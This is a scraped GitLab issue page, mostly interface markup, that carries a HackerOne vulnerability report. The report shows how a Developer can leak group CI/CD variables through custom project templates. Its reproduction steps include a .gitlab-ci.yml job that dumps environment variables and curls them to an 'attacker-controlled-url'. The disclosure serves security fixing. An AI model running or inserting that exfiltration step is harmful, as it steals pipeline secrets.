registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/ml/models&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;operations_menu&quot;,&quot;title&quot;:&quot;Operate&quot;,&quot;icon&quot;:&quot;cloud-pod&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/environments&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;environments&quot;,&quot;title&quot;:&quot;Environments&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/environments&quot;,&quot;link_classes&quot;:&quot;shortcuts-environments&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;infrastructure_registry&quot;,&quot;title&quot;:&quot;Terraform modules&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/terraform_module_registry&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;monitor_menu&quot;,&quot;title&quot;:&quot;Monitor&quot;,&quot;icon&quot;:&quot;monitor&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/incidents&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;incidents&quot;,&quot;title&quot;:&quot;Incidents&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/incidents&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;service_desk&quot;,&quot;title&quot;:&quot;Service Desk&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/issues/service_desk&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;analyze_menu&quot;,&quot;title&quot;:&quot;Analyze&quot;,&quot;icon&quot;:&quot;chart&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/value_stream_analytics&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;cycle_analytics&quot;,&quot;title&quot;:&quot;Value stream analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/value_stream_analytics&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-cycle-analytics&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;contributors&quot;,&quot;title&quot;:&quot;Contributor analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/graphs/master?ref_type=heads&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;ci_cd_analytics&quot;,&quot;title&quot;:&quot;CI/CD analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipelines/charts&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;repository_analytics&quot;,&quot;title&quot;:&quot;Repository analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/graphs/master/charts&quot;,&quot;link_classes&quot;:&quot;shortcuts-repository-charts&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;code_review&quot;,&quot;title&quot;:&quot;Code review analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/analytics/code_reviews&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;issues&quot;,&quot;title&quot;:&quot;Issue analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/analytics/issues_analytics&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;insights&quot;,&quot;title&quot;:&quot;Insights&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/insights/&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-insights&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;model_experiments&quot;,&quot;title&quot;:&quot;Model experiments&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/ml/experiments&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false}],&quot;current_context_header&quot;:&quot;Project&quot;,&quot;support_path&quot;:&quot;https://about.gitlab.com/get-help/&quot;,&quot;docs_path&quot;:&quot;/help/docs&quot;,&quot;display_whats_new&quot;:true,&quot;show_version_check&quot;:null,&quot;search&quot;:{&quot;search_path&quot;:&quot;/search&quot;,&quot;issues_path&quot;:&quot;/dashboard/issues&quot;,&quot;mr_path&quot;:&quot;/dashboard/merge_requests&quot;,&quot;autocomplete_path&quot;:&quot;/search/autocomplete&quot;,&quot;settings_path&quot;:&quot;/search/settings&quot;,&quot;search_context&quot;:{&quot;group&quot;:{&quot;id&quot;:9970,&quot;name&quot;:&quot;GitLab.org&quot;,&quot;full_name&quot;:&quot;GitLab.org&quot;},&quot;group_metadata&quot;:{&quot;issues_path&quot;:&quot;/groups/gitlab-org/-/issues&quot;,&quot;mr_path&quot;:&quot;/groups/gitlab-org/-/merge_requests&quot;},&quot;project&quot;:{&quot;id&quot;:278964,&quot;name&quot;:&quot;GitLab&quot;},&quot;project_metadata&quot;:{&quot;mr_path&quot;:&quot;/gitlab-org/gitlab/-/merge_requests&quot;,&quot;issues_path&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;},&quot;code_search&quot;:false,&quot;scope&quot;:&quot;issues&quot;,&quot;for_snippets&quot;:null}},&quot;panel_type&quot;:&quot;project&quot;,&quot;shortcut_links&quot;:[{&quot;title&quot;:&quot;Snippets&quot;,&quot;href&quot;:&quot;/explore/snippets&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-snippets&quot;},{&quot;title&quot;:&quot;Groups&quot;,&quot;href&quot;:&quot;/explore/groups&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-groups&quot;},{&quot;title&quot;:&quot;Projects&quot;,&quot;href&quot;:&quot;/explore/projects/starred&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-projects&quot;}],&quot;terms&quot;:&quot;/-/users/terms&quot;}"></aside>

<div class="content-wrapper">
<div class="broadcast-wrapper">




</div>
<div class="alert-wrapper alert-wrapper-top-space gl-flex gl-flex-col gl-gap-3 container-fluid container-limited">






























</div>
<div class="top-bar-fixed container-fluid" data-testid="top-bar">
<div class="top-bar-container gl-flex gl-items-center gl-gap-2">
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-start">
<button class="gl-button btn btn-icon btn-md btn-default btn-default-tertiary js-super-sidebar-toggle-expand super-sidebar-toggle -gl-ml-3" aria-controls="super-sidebar" aria-expanded="false" aria-label="Primary navigation sidebar" type="button"><svg class="s16 gl-icon gl-button-icon " data-testid="sidebar-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#sidebar"></use></svg>

</button>
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"GitLab.org","item":"https://gitlab.com/gitlab-org"},{"@type":"ListItem","position":2,"name":"GitLab","item":"https://gitlab.com/gitlab-org/gitlab"},{"@type":"ListItem","position":3,"name":"Issues","item":"https://gitlab.com/gitlab-org/gitlab/-/issues"},{"@type":"ListItem","position":4,"name":"#416244","item":"https://gitlab.com/gitlab-org/gitlab/-/issues/416244"}]}


</script>
<div data-testid="breadcrumb-links" id="js-vue-page-breadcrumbs-wrapper">
<div data-breadcrumbs-json="[{&quot;text&quot;:&quot;GitLab.org&quot;,&quot;href&quot;:&quot;/gitlab-org&quot;,&quot;avatarPath&quot;:&quot;/uploads/-/system/group/avatar/9970/project_avatar.png&quot;},{&quot;text&quot;:&quot;GitLab&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab&quot;,&quot;avatarPath&quot;:&quot;/uploads/-/system/project/avatar/278964/project_avatar.png&quot;},{&quot;text&quot;:&quot;Issues&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;,&quot;avatarPath&quot;:null},{&quot;text&quot;:&quot;#416244&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab/-/issues/416244&quot;,&quot;avatarPath&quot;:null}]" id="js-vue-page-breadcrumbs"></div>
<div id="js-injected-page-breadcrumbs"></div>
</div>


</div>
<div class="gl-flex-none gl-flex gl-items-center gl-justify-center">
<div id="js-advanced-search-modal"></div>

</div>
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-end">
<div id="js-work-item-feedback"></div>


</div>
</div>
</div>

<div class="container-fluid container-limited limit-container-width project-highlight-puc">
<main class="content" id="content-body" itemscope itemtype="http://schema.org/SoftwareSourceCode">
<div class="flash-container flash-container-page sticky" data-testid="flash-container">
<div id="js-global-alerts"></div>
</div>







<div class="issue-details issuable-details js-issue-details">
<div class="detail-page-description content-block js-detail-page-description gl-pt-3 gl-pb-0 gl-border-none">
<div data-header-actions-data="{&quot;can_create_issue&quot;:&quot;true&quot;,&quot;can_create_incident&quot;:&quot;false&quot;,&quot;can_destroy_issue&quot;:&quot;false&quot;,&quot;can_reopen_issue&quot;:&quot;false&quot;,&quot;can_report_spam&quot;:&quot;&quot;,&quot;can_update_issue&quot;:&quot;false&quot;,&quot;is_issue_author&quot;:&quot;false&quot;,&quot;issue_path&quot;:&quot;/gitlab-org/gitlab/-/issues/416244&quot;,&quot;new_issue_path&quot;:&quot;/gitlab-org/gitlab/-/issues/new?add_related_issue=416244&quot;,&quot;project_path&quot;:&quot;gitlab-org/gitlab&quot;,&quot;report_abuse_path&quot;:&quot;/-/abuse_reports/add_category&quot;,&quot;reported_user_id&quot;:2741139,&quot;reported_from_url&quot;:&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/416244&quot;,&quot;submit_as_spam_path&quot;:&quot;/gitlab-org/gitlab/-/issues/416244/mark_as_spam&quot;,&quot;issuable_email_address&quot;:null,&quot;can_promote_to_epic&quot;:&quot;false&quot;}" data-initial="{&quot;endpoint&quot;:&quot;/gitlab-org/gitlab/-/issues/416244&quot;,&quot;updateEndpoint&quot;:&quot;/gitlab-org/gitlab/-/issues/416244.json&quot;,&quot;canUpdate&quot;:false,&quot;canDestroy&quot;:false,&quot;issuableRef&quot;:&quot;#416244&quot;,&quot;imported&quot;:false,&quot;markdownPreviewPath&quot;:&quot;/gitlab-org/gitlab/-/preview_markdown?target_id=416244\u0026target_type=Issue&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;lockVersion&quot;:1,&quot;issuableTemplateNamesPath&quot;:&quot;/gitlab-org/gitlab/description_templates/names/issue&quot;,&quot;initialTitleHtml&quot;:&quot;Developer can leak group and any subgroup’s CI/CD variables using Custom project templates functionality&quot;,&quot;initialTitleText&quot;:&quot;Developer can leak group and any subgroup’s CI/CD variables using Custom project templates functionality&quot;,&quot;initialDescriptionHtml&quot;:&quot;\u003cp data-sourcepos=\&quot;1:1-1:247\&quot; dir=\&quot;auto\&quot;\u003e\u003cgl-emoji title=\&quot;warning sign\&quot; data-name=\&quot;warning\&quot; data-unicode-version=\&quot;4.0\&quot;\u003e⚠\u003c/gl-emoji\u003e \u003cstrong data-sourcepos=\&quot;1:11-1:247\&quot;\u003ePlease read \u003ca data-sourcepos=\&quot;1:25-1:125\&quot; href=\&quot;https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md\&quot;\u003ethe process\u003c/a\u003e on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.\u003c/strong\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;3:1-3:131\&quot; dir=\&quot;auto\&quot;\u003e\u003cstrong data-sourcepos=\&quot;3:1-3:70\&quot;\u003e\u003ca data-sourcepos=\&quot;3:3-3:68\&quot; href=\&quot;https://hackerone.com/reports/2021616\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eHackerOne report #2021616\u003c/a\u003e\u003c/strong\u003e by \u003ccode data-sourcepos=\&quot;3:76-3:82\&quot;\u003etheluci\u003c/code\u003e on 2023-06-12, assigned to \u003ca href=\&quot;/ottilia_westerlund\&quot; data-reference-type=\&quot;user\&quot; data-user=\&quot;12746880\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; class=\&quot;gfm gfm-project_member js-user-link\&quot; title=\&quot;Ottilia Westerlund\&quot;\u003e@ottilia_westerlund\u003c/a\u003e:\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;5:1-5:87\&quot; dir=\&quot;auto\&quot;\u003e\u003ca data-sourcepos=\&quot;5:1-5:17\&quot; href=\&quot;#report\&quot;\u003eReport\u003c/a\u003e | \u003ca data-sourcepos=\&quot;5:21-5:47\&quot; href=\&quot;#attachments\&quot;\u003eAttachments\u003c/a\u003e | \u003ca data-sourcepos=\&quot;5:51-5:87\&quot; href=\&quot;#how-to-reproduce\&quot;\u003eHow To Reproduce\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;7:1-7:9\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-report\&quot; class=\&quot;anchor\&quot; href=\&quot;#report\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eReport\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;9:1-12:143\&quot; dir=\&quot;auto\&quot;\u003eHello,\u003cbr data-sourcepos=\&quot;9:10-9:10\&quot;\u003e\u0026#x000A;Gitlab recently fixed several bugs that allowed a developer to import a project and leak group’s CI/CD variables. To protect against these types of attacks, Gitlab set the minimum role for importing projects to maintainer.\u003cbr data-sourcepos=\&quot;10:227-10:227\&quot;\u003e\u0026#x000A;Gitlab also made the Custom project templates functionality reusable by developers in enterprise edition.\u003cbr data-sourcepos=\&quot;11:108-11:108\&quot;\u003e\u0026#x000A;However, I found a bug using which a Developer can leak group or any subgroup’s CI/CD variables using Custom project templates functionality.\u003c/p\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;14:1-14:16\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-background\&quot; class=\&quot;anchor\&quot; href=\&quot;#background\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eBackground\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;16:1-17:153\&quot; dir=\&quot;auto\&quot;\u003eGitlab provides a \u003cstrong data-sourcepos=\&quot;16:19-16:38\&quot;\u003ePremium/Ultimate\u003c/strong\u003e feature \u003ca data-sourcepos=\&quot;16:48-16:157\&quot; href=\&quot;https://docs.gitlab.com/ee/user/group/custom_project_templates.html\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ecustom project templates functionality.\u003c/a\u003e\u003cbr data-sourcepos=\&quot;16:160-16:160\&quot;\u003e\u0026#x000A;The owner of the top-level group can set a subgroup to be used as a source of custom templates for new projects in the group and in any of the subgroups.\u003c/p\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;19:1-19:19\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-vulnerability\&quot; class=\&quot;anchor\&quot; href=\&quot;#vulnerability\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eVulnerability\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;21:1-22:107\&quot; dir=\&quot;auto\&quot;\u003eWhen issue \u003ca href=\&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/407374\&quot; data-reference-type=\&quot;issue\&quot; data-original=\&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/407374\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;true\&quot; data-project=\&quot;278964\&quot; data-issue=\&quot;126675225\&quot; data-project-path=\&quot;gitlab-org/gitlab\&quot; data-iid=\&quot;407374\&quot; data-issue-type=\&quot;issue\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;User with developer role (group) can modify Protected branches setting on imported project and leak group CI/CD variables\&quot; class=\&quot;gfm gfm-issue\&quot;\u003e#407374 (closed)\u003c/a\u003e was fixed gitlab changed importing logic as follows,\u003cbr data-sourcepos=\&quot;21:119-21:119\&quot;\u003e\u0026#x000A;When a member imports a project where specific members are \u003cstrong data-sourcepos=\&quot;22:60-22:105\&quot;\u003eAllowed to merge/Allowed to push and merge\u003c/strong\u003e -\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;24:1-24:88\&quot; dir=\&quot;auto\&quot;\u003e\u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/3efc73f5bf3de6bfcb525c7a79c291206bf69aad/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33666161613830632d376239612d343666352d383134342d3266383562656265623938352f68696768312e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/3faaa80c-7b9a-46f5-8144-2f85bebeb985/high1.png\&quot;\u003e\u003cimg data-sourcepos=\&quot;24:1-24:88\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;high1.png\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/3faaa80c-7b9a-46f5-8144-2f85bebeb985/high1.png\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/3efc73f5bf3de6bfcb525c7a79c291206bf69aad/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33666161613830632d376239612d343666352d383134342d3266383562656265623938352f68696768312e706e67\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;26:1-27:125\&quot; dir=\&quot;auto\&quot;\u003eThen Gitlab replaces \u003ccode data-sourcepos=\&quot;26:23-26:29\&quot;\u003euser_id\u003c/code\u003e of the member allowed to merge with the \u003ccode data-sourcepos=\&quot;26:73-26:79\&quot;\u003euser_id\u003c/code\u003e of the member importing the project.\u003cbr data-sourcepos=\&quot;26:120-26:120\&quot;\u003e\u0026#x000A;\u003cstrong data-sourcepos=\&quot;27:1-27:125\&quot;\u003eThat is, the member importing the project gets Allowed to merge/Allowed to push and merge access on the protected branch.\u003c/strong\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;29:1-33:104\&quot; dir=\&quot;auto\&quot;\u003e\u0026lt;------------------------------------------Important----------------------------------------------\u0026gt;\u003cbr data-sourcepos=\&quot;29:102-29:102\&quot;\u003e\u0026#x000A;It was probably thought that only maintainers/owners can import a project, thus, them getting allowed to merge access will not be a bug.\u003cbr data-sourcepos=\&quot;30:139-30:139\&quot;\u003e\u0026#x000A;However, Custom project template functionality internally imports the template project.\u003cbr data-sourcepos=\&quot;31:90-31:90\&quot;\u003e\u0026#x000A;Thus, \u003cstrong data-sourcepos=\&quot;32:7-32:132\&quot;\u003eif any maintainer, owner, or any other member has allowed to merge permission on protected branch of any of the templates.\u003c/strong\u003e Then, developer can just import the template (using custom project template functionality) and get allowed to merge setting on the protected branch.\u003cbr data-sourcepos=\&quot;32:284-32:284\&quot;\u003e\u0026#x000A;\u0026lt;------------------------------------------------------------------------------------------------------\u0026gt;\u003c/p\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;35:1-35:26\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-steps-to-reproduce\&quot; class=\&quot;anchor\&quot; href=\&quot;#steps-to-reproduce\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eSteps to reproduce\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;36:1-36:43\&quot; dir=\&quot;auto\&quot;\u003e(Your instance must have an ultimate trial)\u003c/p\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;38:1-42:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;38:1-38:45\&quot;\u003e\u0026#x000A;\u003ccode data-sourcepos=\&quot;38:5-38:10\&quot;\u003evictim\u003c/code\u003e creates a group \u003ccode data-sourcepos=\&quot;38:30-38:41\&quot;\u003evictim-group\u003c/code\u003e.\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;39:1-39:112\&quot;\u003e\u0026#x000A;\u003ccode data-sourcepos=\&quot;39:5-39:10\&quot;\u003evictim\u003c/code\u003e creates a subgroup \u003ccode data-sourcepos=\&quot;39:33-39:55\&quot;\u003esubgroup-to-be-template\u003c/code\u003e and template projects \u003ccode data-sourcepos=\&quot;39:81-39:89\&quot;\u003etemplate1\u003c/code\u003e,\u003ccode data-sourcepos=\&quot;39:93-39:101\&quot;\u003etemplate2\u003c/code\u003e inside.\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;40:1-40:152\&quot;\u003e\u0026#x000A;\u003ccode data-sourcepos=\&quot;40:5-40:10\&quot;\u003evictim\u003c/code\u003e goes to \u003ccode data-sourcepos=\&quot;40:22-40:75\&quot;\u003ehttp://\u0026lt;Your_Instance_IP\u0026gt;/groups/\u0026lt;victim-group\u0026gt;/-/edit\u003c/code\u003e, \u003cstrong data-sourcepos=\&quot;40:79-40:113\&quot;\u003eExpand Custom project templates\u003c/strong\u003e and select \u003ccode data-sourcepos=\&quot;40:127-40:149\&quot;\u003esubgroup-to-be-template\u003c/code\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;41:1-42:0\&quot;\u003e\u0026#x000A;\u003ccode data-sourcepos=\&quot;41:5-41:10\&quot;\u003evictim\u003c/code\u003e goes to template1 repository settings \u003ccode data-sourcepos=\&quot;41:52-41:149\&quot;\u003ehttp://\u0026lt;Your_Instance_IP\u0026gt;/\u0026lt;victim-group\u0026gt;/\u0026lt;subgroup-to-be-template\u0026gt;/template1/-/settings/repository\u003c/code\u003e, \u003cstrong data-sourcepos=\&quot;41:153-41:181\&quot;\u003eExpand Protected branches\u003c/strong\u003e and gives himself \u003cem data-sourcepos=\&quot;41:201-41:218\&quot;\u003eAllowed to merge\u003c/em\u003e OR \u003cem data-sourcepos=\&quot;41:223-41:249\&quot;\u003eAllowed to push and merge\u003c/em\u003e access on protected branch.\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;43:1-43:88\&quot; dir=\&quot;auto\&quot;\u003e\u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/f40d455ab5abe7383748d0c4011687c62de45622/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f39386136393339302d343963632d346466312d396539302d6334323538366161336366662f68696768322e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/98a69390-49cc-4df1-9e90-c42586aa3cff/high2.png\&quot;\u003e\u003cimg data-sourcepos=\&quot;43:1-43:88\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;high2.png\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/98a69390-49cc-4df1-9e90-c42586aa3cff/high2.png\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/f40d455ab5abe7383748d0c4011687c62de45622/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f39386136393339302d343963632d346466312d396539302d6334323538366161336366662f68696768322e706e67\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;45:1-46:121\&quot; dir=\&quot;auto\&quot;\u003eIn a real-world scenario, it may not be the owner but any member (maybe a maintainer or some other member) that has \u003cstrong data-sourcepos=\&quot;45:117-45:162\&quot;\u003eAllowed to merge/Allowed to push and merge\u003c/strong\u003e access on protected branch of any of the templates.\u003cbr data-sourcepos=\&quot;45:217-45:217\&quot;\u003e\u0026#x000A;It might also be possible that no roles are \u003cstrong data-sourcepos=\&quot;46:45-46:90\&quot;\u003eAllowed to merge/Allowed to push and merge\u003c/strong\u003e but specific users (any user).\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;48:1-50:121\&quot; dir=\&quot;auto\&quot;\u003eAs \u003ccode data-sourcepos=\&quot;48:5-48:10\&quot;\u003evictim\u003c/code\u003e,\u003cbr data-sourcepos=\&quot;48:15-48:15\&quot;\u003e\u0026#x000A;5. \u003ccode data-sourcepos=\&quot;49:5-49:10\&quot;\u003evictim\u003c/code\u003e goes to \u003ccode data-sourcepos=\&quot;49:22-49:85\&quot;\u003ehttp://\u0026lt;Your_Instance_IP\u0026gt;/groups/\u0026lt;victim-group\u0026gt;/-/settings/ci_cd\u003c/code\u003e, **Expand Variables ** and adds some CI/CD variables.\u003cbr data-sourcepos=\&quot;49:143-49:143\&quot;\u003e\u0026#x000A;6. \u003ccode data-sourcepos=\&quot;50:5-50:10\&quot;\u003evictim\u003c/code\u003e goes to \u003ccode data-sourcepos=\&quot;50:22-50:84\&quot;\u003ehttp://\u0026lt;Your_Instance_IP\u0026gt;/groups/\u0026lt;victim-group\u0026gt;/-/group_members\u003c/code\u003e and adds \u003ccode data-sourcepos=\&quot;50:97-50:104\&quot;\u003eattacker\u003c/code\u003e as \u003cem data-sourcepos=\&quot;50:110-50:120\&quot;\u003eDeveloper\u003c/em\u003e.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;52:1-56:56\&quot; dir=\&quot;auto\&quot;\u003eAs \u003ccode data-sourcepos=\&quot;52:5-52:12\&quot;\u003eattacker\u003c/code\u003e,\u003cbr data-sourcepos=\&quot;52:17-52:17\&quot;\u003e\u0026#x000A;7. \u003ccode data-sourcepos=\&quot;53:5-53:12\&quot;\u003eattacker\u003c/code\u003e goes to \u003ccode data-sourcepos=\&quot;53:24-53:35\&quot;\u003evictim-group\u003c/code\u003e, clicks on \u003cstrong data-sourcepos=\&quot;53:49-53:63\&quot;\u003enew project\u003c/strong\u003e and chooses Create from template.\u003cbr data-sourcepos=\&quot;53:100-53:100\&quot;\u003e\u0026#x000A;8. \u003ccode data-sourcepos=\&quot;54:5-54:12\&quot;\u003eattacker\u003c/code\u003e uses \u003ccode data-sourcepos=\&quot;54:21-54:29\&quot;\u003etemplate1\u003c/code\u003e and creates \u003ccode data-sourcepos=\&quot;54:45-54:60\&quot;\u003eattacker-project\u003c/code\u003e\u003cbr data-sourcepos=\&quot;54:64-54:64\&quot;\u003e\u0026#x000A;\u003ccode data-sourcepos=\&quot;55:2-55:9\&quot;\u003eattacker\u003c/code\u003e now have \u003cstrong data-sourcepos=\&quot;55:21-55:66\&quot;\u003eAllowed to merge/Allowed to push and merge\u003c/strong\u003e access on protected branch of \u003ccode data-sourcepos=\&quot;55:99-55:114\&quot;\u003eattacker-project\u003c/code\u003e.\u003cbr data-sourcepos=\&quot;55:119-55:119\&quot;\u003e\u0026#x000A;9. \u003ccode data-sourcepos=\&quot;56:5-56:12\&quot;\u003eattacker\u003c/code\u003e adds the following \u003cstrong data-sourcepos=\&quot;56:34-56:56\&quot;\u003e.gitlab-ci.yml file\u003c/strong\u003e\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;58:1-63:3\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003ejob_name:      \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e script:      \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e   - export \u0026gt; test.txt      \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e   - curl -X POST --data \&quot;$(cat test.txt)\&quot; attacker-controlled-url  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;65:1-65:70\&quot; dir=\&quot;auto\&quot;\u003eThe group&#39;s CI/CD variables are sent to \u003cem data-sourcepos=\&quot;65:41-65:69\&quot;\u003e\u003cstrong data-sourcepos=\&quot;65:41-65:69\&quot;\u003eattacker-controlled-url\u003c/strong\u003e\u003c/em\u003e.\u003c/p\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;67:1-67:22\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-output-of-checks\&quot; class=\&quot;anchor\&quot; href=\&quot;#output-of-checks\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eOutput of checks\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;69:1-69:48\&quot; dir=\&quot;auto\&quot;\u003eThis bug happens on Self-hosted Gitlab Instance.\u003c/p\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;71:1-71:40\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-results-of-gitlab-environment-info\&quot; class=\&quot;anchor\&quot; href=\&quot;#results-of-gitlab-environment-info\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eResults of GitLab environment 